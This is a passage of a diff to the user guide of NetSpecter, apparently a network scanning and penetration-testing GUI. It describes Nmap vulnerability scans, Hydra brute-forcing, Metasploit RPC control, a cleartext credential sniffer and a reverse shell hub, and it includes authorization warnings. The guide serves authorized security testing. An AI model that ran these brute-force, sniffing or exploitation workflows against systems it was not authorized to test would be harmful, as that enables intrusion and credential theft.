@@ -1,39 +1,123 @@
 # NetSpecter: Getting Started Guide
 
-Welcome to NetSpecter! This guide will walk you through installing the application, its core features, and how to harness the advanced capabilities of the integrated Nmap orchestration engine.
+Welcome to NetSpecter — a full-stack network security and web application testing platform for authorized penetration testers, network engineers, and security analysts. This guide covers every feature in depth, from initial installation through advanced web application exploitation techniques.
 
-## 0. Installation
+---
+
+## Table of Contents
+
+1. [Installation](#1-installation)
+2. [Settings & Dependency Management](#2-settings--dependency-management)
+3. [Target Acquisition & Scope](#3-target-acquisition--scope)
+4. [Out-of-Scope Blacklist](#4-out-of-scope-blacklist)
+5. [Navigating the Dashboard](#5-navigating-the-dashboard)
+6. [Deep Scanning & Native Discovery](#6-deep-scanning--native-discovery)
+7. [Nmap Orchestration Engine](#7-nmap-orchestration-engine)
+8. [Vulnerability Discovery & CVE Mapping](#8-vulnerability-discovery--cve-mapping)
+9. [NSE Script Explorer](#9-nse-script-explorer)
+10. [Interactive Ncat Sockets](#10-interactive-ncat-sockets)
+11. [VLAN Tag Discovery](#11-vlan-tag-discovery)
+12. [Passive Network Intelligence](#12-passive-network-intelligence)
+13. [SNMP Device Walking](#13-snmp-device-walking)
+14. [Network Topology Map](#14-network-topology-map)
+15. [Live Packet Capture & PCAP Export](#15-live-packet-capture--pcap-export)
+16. [Offensive Pentest Suite](#16-offensive-pentest-suite)
+    - [16A. Multi-Protocol Brute-Force (Hydra)](#16a-multi-protocol-brute-force-hydra)
+    - [16B. Default Credential Spray](#16b-default-credential-spray)
+    - [16C. Metasploit RPC Control Plane](#16c-metasploit-rpc-control-plane)
+    - [16D. Interactive Reverse Shell Hub](#16d-interactive-reverse-shell-hub)
+    - [16E. SMB/NFS Share Explorer](#16e-smbnfs-share-explorer)
+    - [16F. Web Directory Fuzzer](#16f-web-directory-fuzzer)
+17. [Security Monitoring & Hardening](#17-security-monitoring--hardening)
+18. [Container & Cloud Enumeration](#18-container--cloud-enumeration)
+19. [Web Application Testing Workspace](#19-web-application-testing-workspace)
+    - [19A. Intercepting HTTPS Proxy](#19a-intercepting-https-proxy)
+    - [19B. Web Crawling & Sitemap](#19b-web-crawling--sitemap)
+    - [19C. Active Vulnerability Scanner](#19c-active-vulnerability-scanner)
+    - [19D. Request Repeater](#19d-request-repeater)
+    - [19E. Intruder](#19e-intruder)
+    - [19F. Token Sequencer](#19f-token-sequencer)
+    - [19G. Encoder / Decoder](#19g-encoder--decoder)
+    - [19H. Response Comparer](#19h-response-comparer)
+20. [Persisting & Sharing Session Data](#20-persisting--sharing-session-data)
+21. [Keyboard Shortcuts & UI Tips](#21-keyboard-shortcuts--ui-tips)
+
+---
+
+## 1. Installation
 
 ### Windows
-Download the `.exe` installer from the [Releases page](https://github.com/robermar23/netspectre/releases) and double-click to install.
+
+Download the `.exe` installer from the [Releases page](https://github.com/robermar23/netspectre/releases) and double-click to install. The NSIS installer lets you choose the installation directory and creates Start Menu and Desktop shortcuts automatically.
 
 ### macOS
-Download the `.dmg`, open it, and drag NetSpecter into your **Applications** folder.
+
+Download the `.dmg`, open it, and drag NetSpecter into your **Applications** folder. Universal binaries (Intel x64 + Apple Silicon arm64) are provided — no Rosetta translation required on M-series Macs.
 
 ### Linux
-**Recommended:** Download the `.deb` package and install:
+
+#### Recommended — `.deb` (Debian/Ubuntu/Mint):
+
 ```bash
 sudo dpkg -i netspectre_*.deb
 sudo apt-get install -f   # resolve any missing dependencies
 ```
 
-**Fedora/RHEL:** Download the `.rpm` package:
+#### Fedora/RHEL/Rocky — `.rpm`:
+
 ```bash
 sudo dnf install ./netspectre-*.rpm
 ```
 
-**AppImage (advanced):** Requires `libfuse2` (`sudo apt install libfuse2`). Run as a normal user — **do not use `sudo`**. If you must run as root, pass `--no-sandbox`:
+**AppImage (portable, any distro):** Requires `libfuse2` (`sudo apt install libfuse2`). Run as a normal user — do not use `sudo`. If you must run as root, pass `--no-sandbox`:
+
 ```bash
 chmod +x Netspectre-*.AppImage
 ./Netspectre-*.AppImage --no-sandbox
 ```
 
-> **💡 Tip:** NetSpecter detects if you are running as root on Linux and automatically applies the `--no-sandbox` flag internally. For the `.deb` and `.rpm` packages, this is handled seamlessly.
+> **Linux Note:** NetSpecter detects if you are running as root and automatically applies `--no-sandbox` internally. For `.deb` and `.rpm` packages this is handled seamlessly. Raw socket operations (deep port scanning, ICMP ping) require the `cap_net_raw` capability if not running as root:
+>
+> `sudo setcap cap_net_raw+eip /usr/bin/netspectre`
 
-### Optional: Offensive Tools (Hydra, Metasploit, etc.)
-To leverage NetSpecter's red-team capabilities, we recommend installing the following:
+### Optional External Tools
 
-**Hydra Installation (Multi-protocol Brute-Force):**
+Several NetSpecter features delegate to external command-line tools. Install the ones relevant to your workflow:
+
+#### Nmap (Port Scanner & CVE Discovery):
+
+```bash
+# Debian/Ubuntu
+sudo apt install nmap
+
+# macOS (Homebrew)
+brew install nmap
+
+# Windows — download from https://nmap.org/download
+```
+
+#### Wireshark / tshark (Passive Packet Capture):
+
+```bash
+# Debian/Ubuntu
+sudo apt install tshark
+
+# macOS (Homebrew)
+brew install wireshark
+
+# Windows — download Wireshark installer from https://wireshark.org
+# tshark is included in the Wireshark installation.
+```
+
+On Linux, add your user to the `wireshark` group to capture without root:
+
+```bash
+sudo usermod -aG wireshark $USER
+# Log out and back in for the change to take effect.
+```
+
+#### Hydra (Multi-Protocol Brute-Force):
+
 ```bash
 # Debian/Ubuntu
 sudo apt install hydra
@@ -41,13 +125,15 @@ sudo apt install hydra
 # macOS (Homebrew)
 brew install hydra
 
-# Windows — download THC-Hydra from GitHub and add to PATH.
+# Windows — download THC-Hydra from the GitHub releases page and add to PATH.
 ```
 
-**Metasploit Framework (Exploitation Engine):**
-Follow the official [Metasploit Installation Guide](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html). After installation, ensure `msfrpcd` is accessible.
+#### Metasploit Framework:
 
-**SMB/NFS Clients:**
+Follow the official [Metasploit Installation Guide](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html). After installation, ensure `msfrpcd` is in your `PATH`.
+
+#### SMB / NFS Clients:
+
 ```bash
 # Debian/Ubuntu
 sudo apt install smbclient nfs-common
@@ -56,234 +142,1137 @@ sudo apt install smbclient nfs-common
 brew install samba
 ```
 
-**Windows SMB Support (Impacket):**
-Windows natively caches SMB connections, which breaks credential testing and enumeration workflows. Instead of native Windows SMB, NetSpecter relies on Impacket (`impacket-smbclient`) for Windows users.
+#### Windows SMB — Impacket:
+
+Windows natively caches SMB connections, which breaks credential testing and enumeration workflows. NetSpecter uses `impacket-smbclient` on Windows:
+
 1. Install [Python 3](https://www.python.org/downloads/windows/).
-2. Open PowerShell or Command Prompt and run:
+2. In PowerShell or Command Prompt:
+
    ```cmd
    pip install impacket
    ```
-3. Open NetSpecter **Settings** and ensure the `smbclient` path automatically detects `impacket-smbclient.exe` (usually located in your Python `Scripts` folder).
 
-## 1. Target Acquisition and Scope
+3. In NetSpecter **Settings**, confirm the `smbclient` path auto-detects `impacket-smbclient.exe` (usually in your Python `Scripts` folder).
 
-NetSpecter uses a **Target Scope** model, where you define exactly which hosts you are authorized to test before they appear on your dashboard. Click the **＋ Add Hosts** button to open the acquisition modal.
+---
+
+## 2. Settings & Dependency Management
+
+Before scanning, open the **⚙️ Settings** modal (gear icon, top-right). NetSpecter automatically probes your `PATH` for each optional tool and displays a colored status badge:
+
+- **Green "Installed"** — tool detected and ready
+- **Red "Not Found"** — tool not in PATH; install it to unlock dependent features
+
+Features that require a missing tool are automatically hidden from the UI until it is installed. This prevents dead-end button clicks. The full dependency list:
+
+| Tool | Features Unlocked |
+| --- | --- |
+| Nmap | Nmap Deep Scan, Nmap Standard Scan, Targeted Port Analysis, Vuln Scan, NSE Explorer |
+| tshark / Wireshark | VLAN Discovery, Passive Intelligence, PCAP Export, Live Capture |
+| Hydra | Multi-Protocol Brute-Force |
+| smbclient / impacket | SMB/NFS Share Explorer |
+| msfrpcd (Metasploit) | Metasploit RPC Control Plane |
+
+The Settings modal also lets you:
+
+- Override the auto-detected path to any tool (e.g., if Nmap is installed to a custom prefix)
+- Set the Nmap XML output directory
+- Configure the Metasploit RPC host, port, and password
+- Set the web app proxy listen port (default 8080)
+- Export the proxy CA certificate for browser trust store installation
+- Set the Playwright / Chromium executable path for active web crawling
+
+---
+
+## 3. Target Acquisition & Scope
+
+NetSpecter uses a **Target Scope** model. Click the **＋ Add Hosts** button (top toolbar) to open the acquisition modal.
 
 ### The Add Hosts Modal
-The modal is divided into four powerful ingestion methods:
 
-1. **🔍 Discover**: 
-   - Select a network interface (e.g., `eth0`, `Wi-Fi`) and click **Scan Network**.
-   - NetSpecter performs a lightweight ICMP/ARP sweep of the `/24` subnet.
-   - Discovered hosts are added to the **Staging List** below.
+The modal offers four ingestion methods:
 
-2. **✏️ Manual**: 
-   - Manually enter an **IP Address**, **Hostname**, or **MAC Address**.
-   - **CIDR Expansion**: You can enter a range like `192.168.1.0/24`. NetSpecter will automatically expand this into 254 individual target entries in your staging list.
+#### 🔍 Discover
 
-3. **📄 Import File**: 
-   - Load a `.txt` or `.csv` file containing target identifiers (IPs, CIDRs, or hostnames), one per line.
-   - Ideal for large-scale enterprise audits with predefined scopes.
+Select a network interface (e.g., `eth0`, `Wi-Fi`) and click **Scan Network**. NetSpecter performs a lightweight ICMP/ARP sweep of the `/24` subnet. Discovered hosts are added to the **Staging List** below.
 
-4. **📥 Import Nmap XML**: 
-   - Restore a previous session by importing an Nmap XML output file (`-oX`). This loads hosts along with any previously discovered ports, OS versions, and service metadata.
+#### ✏️ Manual
 
-### The Staging Workflow
-Before hosts are added to your live dashboard, they sit in the **Staging List**. This allow you to:
-- **Review**: See exactly what you are about to add.
-- **Deduplicate**: NetSpecter automatically prevents duplicate IP entries.
-- **Filter**: Click the **✕** next to any staged host to remove it from the scope before committing.
+Manually enter an IP address, hostname, or MAC address. CIDR expansion is supported — enter `192.168.1.0/24` and NetSpecter expands it into 254 individual staging entries automatically.
 
-Once satisfied, click **✅ Add to Dashboard**. 
+#### 📄 Import File
 
-> [!NOTE]
-> **Background Probing**: When you manually add or import hosts, NetSpecter automatically triggers a background "enrichment probe" to check if the host is alive and pull basic metadata (MAC/Vendor) without requiring a full Deep Scan.
+Load a `.txt` or `.csv` file containing targets (IPs, CIDRs, or hostnames), one per line. Ideal for pre-defined audit scopes on large enterprise networks.
 
-## 2. Out-of-Scope Blacklist 🛡️
+#### 📥 Import Nmap XML
 
-Use the **Blacklist** button in the top toolbar to define a global exclusion list. 
+Restore a previous session from an Nmap XML output file (`-oX`). This loads hosts together with previously discovered ports, OS versions, and service metadata — no re-scanning needed.
 
-- Add specific IPs, MAC addresses, or CIDR ranges.
-- **Critical Safety**: Blacklisted hosts are **hidden** from the dashboard and **strictly ignored** by all active scanning engines (Native, Nmap, and Pentest Suite).
-- If a discovery scan finds a blacklisted host, it is discarded immediately.
+### Staging Workflow
 
-## 3. Navigating the Dashboard
+Before adding to the live dashboard, all hosts sit in the **Staging List**:
 
-Once the scan completes, a grid of "Host Cards" will populate containing newly discovered IPs on your network.
+- Review what you are about to add
+- NetSpecter automatically prevents duplicate IP entries
+- Click **✕** next to any staged host to remove it from scope before committing
 
-* **Status Indicators**: A pulsing green circle means the host replied successfully.
-* **Metadata Extraction**: Your native devices often identify themselves via MAC Address. NetSpecter intercepts these MAC addresses and automatically fetches their hardware vendor registration (e.g. `Sony`, `Apple`).
-* **View Modes**: At the top right, use the view toggles to seamlessly switch between **Grid Card View**, **Slim List View**, or the **Detailed Table View**.
-* **Filtering and Sorting**: Use the search inputs above the hosts list to filter by IP, OS, or Vendor. Sort the discovered hosts by `IP` (default), `Vendor`, `OS`, or `Open Ports`.
+Once satisfied, click **✅ Add to Dashboard**.
 
-## 4. Deep Sweeping and Native Discovery
+> **Background Probing:** When you manually add or import hosts, NetSpecter automatically triggers a background enrichment probe to check liveness and pull basic metadata (MAC/Vendor) without a full Deep Scan.
 
-If you see an interesting host, click its Host Card to open the **Details Lateral Panel**.
+---
 
-1. Click **Run Deep Scan**. 
-2. NetSpecter will begin raw socket probing across all 65,535 TCP ports on that specific device.
-3. Open ports will pop into the details pane dynamically.
-4. If HTTP (80/443), SSH, or other recognizable banner services are found, the UI will attempt active payload grabs, extracting Software Versions, HTML Titles, and SSL/TLS Certificates.
-5. **Action Shortcuts**: Any exposed standard services (HTTP, SSH, RDP) can be instantly triggered by clicking the native "Connect" buttons next to the respective ports in the Details pane.
-6. **Deep Scan All**: You can proactively run a Deep Scan on all discovered targets by clicking the **"☢️ Deep Scan All"** button near the search filters! You can stop the bulk scan instantly via the same button.
+## 4. Out-of-Scope Blacklist
 
-## 5. Advanced: The Nmap Orchestration Engine
+Click the **🛡️ Blacklist** button in the top toolbar to define a global exclusion list.
 
-While NetSpecter's native engine is blazingly fast, network auditors might want greater depth. We have engineered a zero-modification native wrapper around **Nmap**.
+- Add specific IPs, MAC addresses, or CIDR ranges
+- Blacklisted hosts are **hidden from the dashboard** and **strictly ignored** by all active scanning engines (Native, Nmap, and the entire Pentest Suite)
+- If a discovery scan finds a blacklisted host, it is discarded immediately — it never reaches the UI
+
+Use the blacklist to exclude management infrastructure, production systems outside your test scope, or your own monitoring stations.
+
+---
+
+## 5. Navigating the Dashboard
+
+After a scan completes, a grid of **Host Cards** populates the Network workspace.
+
+### Host Card Elements
+
+- **Pulsing green dot** — host replied to the last probe
+- **IP Address** — primary identifier
+- **Vendor / Manufacturer** — resolved from MAC OUI via `macvendors.com` API (e.g., `Apple Inc.`, `Raspberry Pi Foundation`)
+- **OS badge** — heuristically determined from vendor and open port signatures
+- **Open port count** — from the most recent scan
+- **CVE badge** — red flame icon with count if Nmap vuln scan found CVEs
+- **Web Vuln badge** — orange shield injected when the Web App Scanner finds vulnerabilities on this host's HTTP ports
+
+### View Modes
+
+Use the view toggles (top-right of the host grid):
+
+| Mode | Best For |
+| --- | --- |
+| Grid Card View | Visual overview, fast at-a-glance status |
+| Slim List View | Large host counts, dense information display |
+| Detailed Table View | Sortable columns, copy-paste friendly |
+
+### Filtering & Sorting
+
+Use the search inputs above the host list to filter by:
+
+- IP address (partial match)
+- OS (Windows, macOS, Linux, Android, iOS)
+- Vendor / Manufacturer
+- Open port number
+
+Sort by: IP (default), Vendor, OS, or Open Port Count.
+
+---
+
+## 6. Deep Scanning & Native Discovery
+
+Click any Host Card to open the **Host Details Panel** on the right side of the screen.
+
+### Running a Deep Scan
+
+1. Click **Run Deep Scan**
+2. NetSpecter chunks raw TCP socket probes across all **65,535 ports**
+3. Open ports appear dynamically in the panel as they are discovered
+4. For recognized services (HTTP, SSH, HTTPS, FTP), NetSpecter performs active banner grabs, extracting software versions, HTTP server headers, HTML page titles, and SSL/TLS certificate details
+5. Click **Cancel** at any time to stop the in-progress scan
+
+### Port Action Shortcuts
+
+Once ports are discovered, contextual action buttons appear inline:
+
+| Port | Action Buttons |
+| --- | --- |
+| 22 (SSH) | Connect (opens terminal), Brute Force |
+| 80 / 443 / 8080 / 8443 | Open in Browser, Dir Fuzz, Send to Scanner |
+| 139 / 445 (SMB) | Enumerate Shares, Brute Force |
+| 3389 (RDP) | Connect, Brute Force |
+| 21 (FTP) | Brute Force |
+| Any HTTP port | Dir Fuzz, Send to Scanner |
+
+### Deep Scan All
+
+Click **☢️ Deep Scan All** in the top toolbar to run a deep scan on every host in the current dashboard. Progress bars appear per-host. Click the same button again to cancel the bulk operation.
+
+---
+
+## 7. Nmap Orchestration Engine
+
+While NetSpecter's native engine is fast, the Nmap integration provides deeper fingerprinting, service version detection, and script-based vulnerability discovery.
+
+### Enabling Nmap
+
+Nmap must be installed and detected (green badge in Settings). In the Host Details Panel, use the **Engine** toggle to switch from **Native** to **Nmap**.
+
+### Nmap Scan Types
+
+#### Nmap Deep Scan (All Ports)
+
+Scans all 65,535 ports with `-A` timing and full fingerprinting. Captures OS detection, version detection, and script results. Slower but comprehensive.
+
+#### Nmap Standard Scan
+
+Scans the default top-1000 ports with `-A` aggressive detection flags. Recommended for first-pass enumeration.
+
+#### Targeted Port Scan
+
+Click any discovered open port tag in the Details panel while in Nmap mode. NetSpecter launches a targeted `-sV -sC` service scan against that specific port to extract exact process/version information.
+
+#### Nmap Vuln Scan
+
+Runs `--script vuln` against the host to trigger NSE vulnerability detection scripts. Results are parsed in real-time for CVE identifiers (see Section 8).
 
 ### Installing Nmap
-If Nmap is not installed in your system `$PATH` (or explicitly via standard defaults), a blue banner will appear instructing you to download it natively from `nmap.org`. NetSpecter natively attempts dynamic `$PATH` detection (`where nmap` / `which nmap`) to automatically discover custom installation prefixes.
 
-### Leveraging Nmap
-Once Nmap is installed, open the Details Panel for any Host. You'll see an "Engine" toggle button. Switch it to **Nmap**. 
+If Nmap is not detected, a blue banner appears in the Details panel with a link to the download page. NetSpecter tries `which nmap` (Linux/macOS) and `where nmap` (Windows) plus common installation prefixes. If your installation is in a non-standard path, set it manually in **Settings**.
 
-You now have access to four hyper-advanced features:
+---
 
-1. **Nmap Deep Scan (All Ports)**: Aggressively checks all 65,535 ports using `-A` timing and fingerprinting options. 
-2. **Nmap Standard Host Scan**: Scans the default 1000 top ports quickly using `-A` aggressive OS detection flags.
-3. **Targeted Port Analysis**: Hover over any previously discovered Open Port blue tag in the UI and click it. NetSpecter spins up a targeted Nmap Service Scan (`-sV -sC`) directly against that specific listening socket to scrape exactly what process is running behind it.
-4. **Nmap Vuln Scan (Scripts)**: Executes the aggressive `--script vuln` map against the host. 
+## 8. Vulnerability Discovery & CVE Mapping
 
-## 6. Vulnerability Discovery (CVE Mapping)
+When you run the **Nmap Vuln Scan**, NetSpecter intercepts the raw terminal output buffer asynchronously:
 
-When using the **Nmap Vuln Scan**, NetSpecter intercepts the raw terminal output buffer directly.
+- Searches for `VULNERABILITY:` blocks in the Nmap output stream
+- Extracts the CVE identifier, CVSS severity score (Critical / High / Medium / Low), and description
+- Dynamically generates links to `vulners.com` and `exploit-db.com` when public exploit PoCs are available
+- Injects stylized vulnerability definition cards into the Host Details panel
+- Updates the host card's security badge:
+  - **Red flame + CVE count** — one or more CVEs found
+  - **Green "Audited Secure"** — vuln scan completed with no findings
 
-* It searches for `VULNERABILITY:` blocks. 
-* It extracts the `CVE ID`, the `CVSS severity score` (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`), and dynamically links directly to `vulners.com` or `exploit-db.com` if exploit PoCs are publicly available.
-* All discovered vulnerabilities are cleanly mapped to a red "Vulnerabilities Discovered" list inside the Details panel. 
-* The primary Dashboard Host Card security badge handles state propagation, flipping to a blazing red flag quantifying exactly how many Critical CVEs are bound to the specific host. If no vulnerabilities are found, it receives a glowing green `Audited Secure` badge.
+All discovered CVEs are cached in the host's `deepAudit` object and persisted when you save the session (see Section 20).
 
-## 7. Nmap Scripting Engine (NSE) Explorer
+---
 
-At the bottom of the Nmap actions list is the powerful **NSE Explorer Dropdown**.
+## 9. NSE Script Explorer
 
-When NetSpecter starts, it hunts your file system to discover your native Nmap installation footprint. It ingests all 600+ `.nse` lua scripts and categorizes them.
+At the bottom of the Nmap actions list is the **NSE Explorer** dropdown. NetSpecter scans your filesystem to discover all installed `.nse` Lua scripts (600+) and presents them in a searchable, categorized selector.
 
-* Search for any script (e.g. `smb-`, `http-`) inside the input terminal.
-* A dropdown will perfectly categorize them using dynamic color risk-badges (`safe` (Green), `discovery` (Blue), `intrusive/dos` (Yellow), `vuln/exploit` (Red)) so you know exactly how dangerous a payload is before sending it.
-* You can append optional script arguments (e.g. `--script-args user=admin`) into the secondary box. 
-* Click "Run Custom Script" and the execution outputs natively into the dashboard terminal blocks.
+### Using the NSE Explorer
 
-## 8. Interactive Ncat Sockets
+1. Type in the search box to filter scripts (e.g., `smb-`, `http-`, `ssl-`)
+2. Scripts are tagged with color-coded risk badges:
+   - **Green "safe"** — passive information gathering
+   - **Blue "discovery"** — active but benign probing
+   - **Yellow "intrusive"** — may trigger logs or affect target state
+   - **Red "vuln/exploit"** — active exploitation attempts
+3. Select the script from the dropdown
+4. Optionally add script arguments in the secondary input (e.g., `--script-args user=admin,pass=admin`)
+5. Click **Run Custom Script** — output streams to the terminal block in the Details panel
 
-Behind the Nmap Engine toggle is the localized **Ncat** Engine. This allows for raw TCP/UDP socket connectivity directly from the GUI.
+---
 
-1. Switch to the **Ncat** engine tab inside the Details panel.
-2. Enter the target `Port`.
-3. Fill out the `Payload` field (e.g. `GET / HTTP/1.0\r\n\r\n` or raw byte drops).
-4. Click Connect & Send. The UI will keep the stream open to visualize bidirectional byte-drops mimicking raw native network connectivity.
+## 10. Interactive Ncat Sockets
 
-## 9. VLAN Tag Discovery (Tshark)
+The **Ncat** engine tab in the Host Details panel provides raw TCP/UDP socket connectivity directly from the GUI — no terminal window required.
 
-NetSpecter natively integrates with Wireshark's CLI tool (`tshark`) to passively hunt for 802.1Q tags on your network interfaces, useful for uncovering misconfigured Trunk ports or preventing VLAN Hopping attacks.
+1. Switch to the **Ncat** tab inside the Details panel
+2. Enter the target **Port**
+3. Fill the **Payload** field (e.g., `GET / HTTP/1.0\r\n\r\n` or any raw bytes)
+4. Click **Connect & Send** — the stream stays open for bidirectional communication, visualizing raw byte exchanges in real time
 
-1. Ensure Tshark is installed and enabled in the **Settings** modal.
-2. Click the **🦈 VLAN Discovery** button located in the top control bar (next to the view toggles) to open the VLAN panel.
-3. Choose the physical interface you want to listen on.
-4. Click **Start Capture**. NetSpecter will transparently orchestrate a Wireshark capture filtered strictly to `vlan` packets.
-5. As tagged frames are intercepted traversing the wire, the UI will extract the `VLAN ID` and the source/destination MAC addresses, appending them securely to the streaming dashboard widget in real-time.
+---
 
-## 10. Passive Network Intelligence (Tshark)
+## 11. VLAN Tag Discovery
 
-NetSpecter also features a powerful **Passive Intelligence** suite backed by Tshark. This allows you to silently monitor the network for configuration issues, security threats, and hidden hosts.
+NetSpecter integrates with `tshark` to passively listen for 802.1Q-tagged frames — useful for identifying misconfigured trunk ports or testing VLAN hopping defenses.
 
-1. Click the **🕵️ Passive Intelligence** button in the top toolbar to open the panel.
-2. Select your listening interface from the dropdown.
-3. Toggle any of the four available modules:
-   * **DHCP Rogue Detection**: Alerts you immediately if an unknown or spoofed DHCP server starts offering IP addresses on your subnet.
-   * **Credential Sniffer**: Silently extracts cleartext passwords from insecure protocols like FTP, Telnet, HTTP Basic Auth, POP3, and IMAP. *(Note: You must explicitly accept a legal disclaimer before activating this module).*
-   * **DNS Harvester**: Monitors DNS and mDNS queries passively. Any newly discovered hosts are seamlessly promoted to your main NetSpecter dashboard without sending a single active probe.
-   * **ARP Spoofing Detection**: Monitors ARP replies to instantly detect Man-in-the-Middle (MitM) ARP poisoning attacks and gratuitous ARP announcements.
-4. **PCAP Export**: Need raw packet data? Click the **📥 Export PCAP...** button to spawn a targeted packet capture saved directly to your hard drive, ready for Wireshark analysis.
+**Requirements:** tshark installed and enabled in Settings.
 
-## 11. SNMP Device Walking
+1. Click the **🦈 VLAN Discovery** button in the top control bar to open the VLAN panel
+2. Select the physical network interface from the dropdown
+3. Click **Start Capture**
+4. NetSpecter runs a tshark capture filtered to VLAN-tagged packets
+5. As tagged frames are detected, the UI extracts the **VLAN ID** and source/destination MAC addresses, appending them to the live results panel
 
-NetSpecter supports SNMPv1, v2c, and v3 walking to extract detailed operational metrics from routers, switches, and local servers.
+Tagged frames on an access port indicate a VLAN hopping risk. Legitimate trunk ports should only appear on uplink interfaces.
 
-1. Ensure the target host is running an SNMP agent (e.g., `snmpd`).
-2. Click on the host in the main dashboard to open the **Details Panel**.
-3. Under the "Actions" section, click **SNMP Walk**.
-4. Configure the SNMP Version and Community String (for v1/v2c) or Security/Auth parameters (for v3).
-5. Click **Start Walk**. NetSpecter will concurrently pull Interface Statistics, System Descriptions, Routing Tables, and ARP caches.
+---
 
-## 12. Network Topology Map
+## 12. Passive Network Intelligence
 
-Transform your flat host grid into an interactive visual graph to understand network topology at a glance.
+The **Passive Intelligence** suite monitors the network silently using tshark. Click the **🕵️ Passive Intelligence** button in the top toolbar to open the panel.
 
-1. Discover hosts on your subnet using the standard native scan.
-2. In the top navigation bar, click the **📡 Topology** tab.
-3. Your network will be automatically rendered using Cytoscape.js. Subnets are clustered, and hosts are linked to their respective detected gateways.
-4. Interact with the graph: Click nodes to open their Host Details, use the toolbar to switch layouts (Force-directed, Hierarchical), or export the graph via the **Camera** icon.
+**Requirements:** tshark installed and enabled in Settings.
 
-## 13. Live Packet Capture & Analysis
+### Setup
 
-Need deeper forensic visibility into a specific machine? NetSpecter integrates live `tshark` capture capabilities directly into the UI.
+1. Select your listening interface from the dropdown
+2. Toggle the modules you want active (each module runs an independent tshark filter)
+3. Click **Start Monitoring** — all selected modules start simultaneously
 
-1. Navigate to the **Passive Intelligence** panel, or right-click any host in the grid and select **Capture Packets**.
-2. Set a Capture Filter (e.g. `host 192.168.1.5` or `tcp port 80`) and Duration.
-3. Click **Start Capture**.
-4. The panel will stream packets in real-time. The **Stats Dashboard** instantly categorizes protocol distributions (TCP, UDP, ICMP), identifies Top Talkers, and alerts you to any Cleartext Protocols (like HTTP or FTP) detected on the wire.
+### Modules
 
-## 14. Rogue DNS Detection
+#### DHCP Rogue Detection
 
-Similar to Rogue DHCP, the Rogue DNS module passively hunts for unauthorized name servers or DNS spoofing.
+Monitors DHCP OFFER and ACK messages. When an unknown DHCP server is detected offering IP addresses on your subnet, a high-severity alert card is immediately injected into the dashboard with the rogue server's MAC and IP.
 
-1. Open the **🕵️ Passive Intelligence** panel.
-2. Toggle on the **🌐 Rogue DNS** module.
-3. NetSpecter will establish a baseline of trusted DNS responders. If an unexpected server responds, or if conflicting A records are offered within a short window, a high-severity alert card is injected into the dashboard natively.
+#### Credential Sniffer
 
-## 15. Offensive Pentest Suite (NEW)
-NetSpecter now includes a powerful suite of offensive tools designed for authorized penetration testing and red-teaming. These tools are accessible via the **⚔️ Pentest** tab or the host context menu.
+> **Legal Warning:** Activating this module captures cleartext credentials transmitted on your network. You must accept a legal disclaimer before first use. Only activate this on networks you are explicitly authorized to monitor.
 
-> [!CAUTION]
-> These tools perform active offensive operations. Only use them on networks and systems you are explicitly authorized to test.
+Extracts credentials from FTP, Telnet, HTTP Basic Auth, POP3, and IMAP traffic. Captured credentials are displayed in the Passive Intel panel and are **never persisted to disk**.
 
-### 16. Multi-Protocol Brute-Force (Hydra)
-Automate credential discovery across multiple services using the integrated THC-Hydra engine.
+#### DNS Harvester
 
-1. Right-click a target host and select **Pentest** → **Brute-Force Attack...**
-2. **Select Protocol**: Choose from SSH, FTP, Telnet, HTTP, SMB, RDP, and more.
-3. **Configure Settings**:
-   * **Username**: Enter a single username or toggle "Load User List" to pick a `.txt` file.
-   * **Wordlist**: Select your custom password wordlist via the native file browser.
-   * **Threads/Delay**: Adjust the concurrency (default 4) and timing to avoid service lockouts.
-4. **Start Attack**: Click **Start Brute-Force**. Credential hits will appear in real-time in the results table.
+Monitors DNS and mDNS queries passively. Any host that announces itself through name resolution (even if it ignores ICMP pings) is automatically discovered and promoted to your main dashboard — no active probe required. Useful for finding IoT devices, printers, and Apple devices that suppress ICMP.
 
-### 17. Metasploit RPC Control Plane
-Orchestrate the Metasploit Framework directly from NetSpecter. This requires a running `msfrpcd` daemon.
+#### ARP Spoofing Detection
 
-1. **Start Metasploit RPC**: Open a terminal and run `msfrpcd -P <password> -S -f`.
-2. **Connect**: In NetSpecter, go to the **Pentest** tab → **Metasploit Manager**. Enter your RPC credentials and click **Connect**.
-3. **Exploit Search**: Use the searchable module database to find relevant exploits.
-4. **Launch & Manage**: Configure exploit options (Target, RPORT, Payload) and click **Run**. Successful exploits will populate the **Active Sessions** list, where you can interact with shells or kill sessions.
+Monitors ARP replies for IP-to-MAC mapping conflicts. When an IP address is claimed by two different MAC addresses within a short window, or when gratuitous ARP announcements are detected, a Man-in-the-Middle alert fires immediately with the conflicting mappings shown side-by-side.
 
-### 18. Interactive Reverse Shell Hub
+#### Rogue DNS Detection
+
+Establishes a baseline of trusted DNS responders by observing the first few DNS responses. If subsequent DNS replies originate from an unexpected server, or if conflicting A records are returned for the same hostname, a high-severity alert card is injected into the dashboard indicating potential DNS hijacking.
+
+### PCAP Export
+
+At the bottom of the Passive Intelligence panel, click **📥 Export PCAP...** to launch a targeted packet capture. Configure:
+
+- Capture interface
+- BPF filter (e.g., `host 192.168.1.5` or `tcp port 80`)
+- Capture duration (seconds)
+- Output file path
+
+Click **Start Capture** — the panel streams packet summaries in real time. When complete (or when you click Stop), the `.pcap` file is saved and ready for offline analysis in Wireshark.
+
+---
+
+## 13. SNMP Device Walking
+
+NetSpecter supports SNMPv1, v2c, and v3 walking to extract detailed operational data from routers, switches, printers, and servers.
+
+### Walking a Device
+
+1. Click a host in the dashboard to open the **Host Details Panel**
+2. In the **Actions** section, click **SNMP Walk**
+3. Configure the walk parameters:
+   - **Version**: v1, v2c, or v3
+   - **Community String** (v1/v2c): typically `public` for read-only access
+   - **Security Name / Auth / Privacy** (v3): USM credentials
+   - **OID Prefix** (optional): scope the walk (e.g., `1.3.6.1.2.1.1` for system info only)
+4. Click **Start Walk**
+
+### Results
+
+NetSpecter concurrently pulls and parses:
+
+- **System Description** (sysDescr) — firmware version, OS, hardware model
+- **Interface Statistics** — interface names, speeds, byte counters (ifTable)
+- **IP Routing Table** — routes and next-hops
+- **ARP Cache** — IP-to-MAC mappings seen by the device
+- **CPU / Memory** (if supported by vendor MIB)
+
+Results are grouped by OID category in an expandable tree view. Click any row to see the full OID path and raw value.
+
+---
+
+## 14. Network Topology Map
+
+Transform the flat host grid into an interactive visual graph.
+
+1. Discover hosts via the standard network scan
+2. Click the **📡 Topology** tab in the top navigation bar
